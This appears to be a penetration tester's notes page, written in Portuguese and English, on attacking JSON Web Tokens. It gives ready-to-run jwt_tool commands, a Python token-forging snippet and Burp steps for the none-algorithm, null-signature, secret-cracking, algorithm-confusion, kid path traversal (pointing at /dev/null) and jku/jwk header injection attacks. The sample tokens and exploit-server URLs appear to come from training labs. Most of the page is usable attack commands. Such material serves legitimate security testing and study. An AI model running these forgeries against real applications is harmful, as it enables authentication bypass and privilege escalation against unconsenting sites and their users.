# JSON Web Tokens

Fonte: [https://blog.intigriti.com/2021/07/27/hacker-tools-jwt\_tool/?cn-reloaded=1](https://blog.intigriti.com/2021/07/27/hacker-tools-jwt\_tool/?cn-reloaded=1)

Possiveis ataques JWT:

* [Algorítmo "none"](<JSON Web Tokens.md#NoneAlgorithm>)
* [Cracking the secret key](<JSON Web Tokens.md#CrackingSecretKey>)
* [Public Key Confusion](<JSON Web Tokens.md#PublicKeyConfusion>)

## JWT Format

Resuminho de commom funciona o JWT

JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`

Example : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

Where we can split it into 3 components separated by a dot.

```powershell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header ==> JWS
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
```

### Header

Registered header parameter names defined in [JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515).
The most basic JWT header is the following JSON.

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

Other parameters are registered in the RFC.

| Parameter | Definition                           | Description |
|-----------|--------------------------------------|-------------|
| alg       | Algorithm                            | Identifies the cryptographic algorithm used to secure the JWS |
| jku       | JWK Set URL                          | Refers to a resource for a set of JSON-encoded public keys    |
| jwk       | JSON Web Key                         | The public key used to digitally sign the JWS                 |
| kid       | Key ID                               | The key used to secure the JWS                                |
| x5u       | X.509 URL                            | URL for the X.509 public key certificate or certificate chain |
| x5c       | X.509 Certificate Chain              | X.509 public key certificate or certificate chain in PEM-encoded used to digitally sign the JWS |
| x5t       | X.509 Certificate SHA-1 Thumbprint)  | Base64 url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate       |
| x5t#S256  | X.509 Certificate SHA-256 Thumbprint | Base64 url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate     |
| typ       | Type                                 | Media Type. Usually `JWT` |
| cty       | Content Type                         | This header parameter is not recommended to use |
| crit      | Critical                             | Extensions and/or JWA are being used |


Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
"RS256" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).

| `alg` Param Value  | Digital Signature or MAC Algorithm | Requirements |
|-------|------------------------------------------------|---------------|
| HS256 | HMAC using SHA-256                             | Required      |
| HS384 | HMAC using SHA-384                             | Optional      |
| HS512 | HMAC using SHA-512                             | Optional      |
| RS256	| RSASSA-PKCS1-v1_5 using SHA-256                | Recommended   |
| RS384 | RSASSA-PKCS1-v1_5 using SHA-384                | Optional      |
| RS512 | RSASSA-PKCS1-v1_5 using SHA-512                | Optional      |
| ES256 | ECDSA using P-256 and SHA-256	                 | Recommended   |
| ES384 | ECDSA using P-384 and SHA-384                  | Optional      |
| ES512 | ECDSA using P-521 and SHA-512	                 | Optional      |
| PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 | Optional      |
| PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 | Optional      |
| PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 | Optional      |
| none	| No digital signature or MAC performed          | Required      |

### Payload

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

Claims are the predefined keys and their values:
- iss: issuer of the token
- exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds.
- iat: The time the JWT was issued. Can be used to determine the age of the JWT
- nbf: "not before" is a future time when the token will become active.
- jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed.
- sub: subject of the token (rarely used)
- aud: audience of the token (also rarely used)

## Null Signature

Send a JWT with HS256 algorithm without a signature like 

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

## NoneAlgorithm

Exemplo de JWT:

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLWhtZy52ZW5kYXBwLmNvbS5iclwvdjFcL2F1dGhcL3NpZ24taW4iLCJpYXQiOjE2Nzk5Mjg5ODEsImV4cCI6MTY3OTkzMjU4MSwibmJmIjoxNjc5OTI4OTgxLCJqdGkiOiJZOEhLcU9LQ1ZYbTJrc3VDIiwic3ViIjo4MiwicHJ2IjoiNzE0NzAxYTZhYTFkYzM2ODI0Y2FhOGZkNDU3YzIyOTZhMGJjYWZkZSJ9.GEOEmIlxy7Oe\_FtfqMSEnx-0RXnvTTXH8aHYxOZYnxc

Obter a primeira parte do JWT (todo o antes antes do primeiro ".") e executar o seguinte comando:

```
echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
```

Para obter o payload em texto claro, pegamos a segunda parte (tudo que tiver entre os dois ".") e executar o seguinte comando:

```
echo eyJpc3MiOiJodHRwczpcL1wvYXBpLWhtZy52ZW5kYXBwLmNvbS5iclwvdjFcL2F1dGhcL3NpZ24taW4iLCJpYXQiOjE2Nzk5Mjg5ODEsImV4cCI6MTY3OTkzMjU4MSwibmJmIjoxNjc5OTI4OTgxLCJqdGkiOiJZOEhLcU9LQ1ZYbTJrc3VDIiwic3ViIjo4MiwicHJ2IjoiNzE0NzAxYTZhYTFkYzM2ODI0Y2FhOGZkNDU3YzIyOTZhMGJjYWZkZSJ9 | base64 -d
```

Vide imagem acima para demonstracao:

O ataque em si consiste em alterar a primeira parte do JWT conforme o seguinte comando :

```
echo -n '{"typ":"JWT","alg":"None"}' | base64
```

Depois, devemos considerar a alteracao do payload para obter algum tipo de esccalacao de privilegio ou algo assim, no entanto, vale ressaltar que basta removermos a ultima parte do JWT e disparar para verificar se a aplicacao acata a requisicao.

## Signature disclosure

Disparar o jwt sem a assinatura ou com uma assinatura inválida para o servidor e ver se ele retorna uma assinatura válida.


## Algorithm confusion/Key Confusion Attack

1. First make 2 JWT signed
2. Then run jws2pubkey.py to generate public key
3. get one of the JWTs and copy kid and alg variables and paste into burp's JWT Editor. Depois clicar OK
4. Right click in the public key and click Copy Public Key as PEM
5. In the Decoder tab, paste the Public Key and encode in base 64 (BE CAREFUL WITH THE LAST EMPTY LINE. THIS IS NECESSARY TO THE ATTACK WORKS)
6. Copy the entire string base64 encoded and click "New Symetric Key", then generate. After that paste as the bas64 encodedstring into variable "k" like screenshot below:
7. Inside make the request via web browser to facilitate then, send to repeater, change the header of the algorithm to HS256, change the payload and then sign the JWT

see the video below

[JWT\_AlgorithmConfusion.mp4](../../.gitbook/assets/JWT\_AlgorithmConfusion.mp4)

{% embed url="https://youtu.be/cNL6NWpsrn4" %}


[Video](https://youtu.be/cNL6NWpsrn4)

Outra opção é utilzar o jwt_tool

Considerando que já estamos em posse da chave pública no formato PEM (vide vídeo acima), podemos fazer o ataque da seguinte maneira:

    python3 jwt_tool.py JWT_HERE -T

Altera o payload para o que for necessário e depois assina o JWT com a chave pública dessa forma

    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem

Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server: 
    
    openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout

## Signature attack - KID header path traversal

The kid (Key ID) is an optional parameter specified in the JWT header part to indicate the key used for signature validation in case there are multiple ones. The structure of this ID is not specified and it can be any string value (case-sensitive). The last part is interesting because, if the parameter is vulnerable to directory traversal, this would allow to perform path traversal and point to a file path/file with content we can guess or known somehow, and use its content as the value of the signing key.

There are a bunch of files in /sys that are basically flags. Like the flag that says if ftrace is enabled is either 0 or 1. So the attacker just creates 2 tokens with that as the key and one of them will work!
(By Intigriti on Twitter)
The example mentioned above is located at /proc/sys/kernel/ftrace_enabled
In some cases, using the trick above will not work, as the file is listed with a size of 0, and some apps could check that the signature file is not empty.
>>> import os
>>> os.path.getsize("/proc/sys/kernel/ftrace_enabled")

Alternatively, other file could be used:
some have a content that rarely changes (e.g. old configuration files like/etc/host.conf, /etc/xattr.conf, ...)
some have a predictable content (e.g. /etc/hostname, JS files in /var/www/html, ...)
some return an empty string (e.g. /dev/null) effectively allowing to bypass the signature validation, meaning an empty key could be used for signature.
```  
import jwt, os
payload = {'key1':'value1', 'key2':'value2'}
with open("path/to/file", 'r') as file:
    data = file.read()
token = jwt.encode(payload, key=data, algorithm='HS256', headers={"kid": "../../../path/to/file"})
print(token)
```
If Burp is used to craft the JWT token, a symmetric key with value of the k property in the JWT equal to AA== (base64 value of null byte) must be created.

## JWT TOOL

### Tampering JWT

Aqui basicamente não existe checagem de verificação do JWT. Basta alterar qualquer valor

```
python3 jwt_tool.py <<JWT_TOKEN>> -T
```

### Null signature

Obter uma assinatura válida com esse ataque

```
python3 jwt_tool.py <<JWT_TOKEN>> -X n
```

### NoneAlgorithm

Bypassr qualquer validação da assinatura

```
python3 jwt_tool.py <<JWT_TOKEN>> -X a
```

### CrackingSecretKey

Esse ataque só é possível quando utilizado os algorítmos HS256, HS512, pois utilizamm de criptografia simétrica.
RS256 signs the token asymmetrically. It uses private key to sign the token and public key to verify the token. In case of — ‘HS256’ — signs the token symmetrically. It uses same key to sign and verify the token. The HMAC key and RSA private key are secret, is not known to public but the RSA public key is known to public.

```
python3 jwt_tool.py <<JWT_TOKEN>> -C -d <<DICT_FILE>>
```
Then change the payload with tampering

```
python3 jwt_tool.py <<JWT_TOKEN>> -T
```

Then sign the JWT again with the secret

```
python3 jwt_tool.py <<JWT_TOKEN>> -S hs256 -p secret
```


{% embed url="https://youtu.be/j8C0TiXAqFc" %}

### Algorithm/Key confusion

Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server: 
    
    openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout

Considerando que já estamos em posse da chave pública no formato PEM, podemos fazer o ataque da seguinte maneira:

    python3 jwt_tool.py JWT_HERE -T

Altera o payload para o que for necessário e depois assina o JWT com a chave pública dessa forma

    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem

**Se atentar ao arquivo .pem, porque ele NÃO PODE TER UM MSALTO DE LINHA NO FINAL. Caso contrário, a chave não funciona**


### KID Path traversal

```
jwt_tool eyJraWQiOiI1MjQwYjcyMS1lMTFjLTQwYzItYWRlNC01MGY0NzZkNGRhYWIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcwOTA1NDMwNCwic3ViIjoid2llbmVyIn0.VTmB0FRB1CfjL2jn1S5FA5OXk6tPLS8RMpwQx-S6-yM -T
>1 #KID number, in this case 1, for example
>../../../../../dev/null
>3
>administrator # Changing payload

jwt_tool eyJraWQiOiIuLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcwOTA1NDMwNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.VTmB0FRB1CfjL2jn1S5FA5OXk6tPLS8RMpwQx-S6-yM -S hs256 -p ""
```
{% embed url="https://youtu.be/YYC_dFaxM5U"%}


### jku header injection

    jwt_tool <<JWT_HERE>> -X s -ju https://exploit-0a95005103cfc28d82fba0640183004a.exploit-server.net/exploit -T

**ATENÇÃO QUANTO AO FATO DE O KID SER ALTERADO PARA O KID INFORMADO NA CHAVE PÚBLICA**

Lembrando que a ferramenta utiliza do arquivo de configuração encontrado em:

    ~/.jwt_tool/*

Utilizando o burp, vamos seguir os passos:

1. Gerar o JWT
2. (No JWT Editor) Gerar uma chave RSA em formato JWK (JWT Editor => New RSA Key => Generate) , copiar o valkor do KID para utilizá-lo no cabeçalho do JWT forjado
3. retornar ao repeater e reescrever o cabeçalho do JWT com o KID gerado na chave pública, e inserir o cabeçalho jku com uma URL na qual hospedamos a chave pública (vide vídeo)
4. reassinar o JWT com o botão de assinar no Burp e transmitir a requisição

{%embed url="https://youtu.be/wlscbGPdj4o" %}

### jwk header injection

**ATENÇÃO QUANTO AO FATO DE O KID SER ALTERADO PARA O KID INFORMADO NA CHAVE PÚBLICA DENTRO DO JWS**

    jwt_tool <<JWT_HERE>> -X i -T

{%embed url="https://youtu.be/MgDxJA_pJqc" %}

## Customizations

Customizações da ferramenta JWT_TOOL

Conf file 

    ~/.jwt_tool/jwtconf.ini
    
    
    
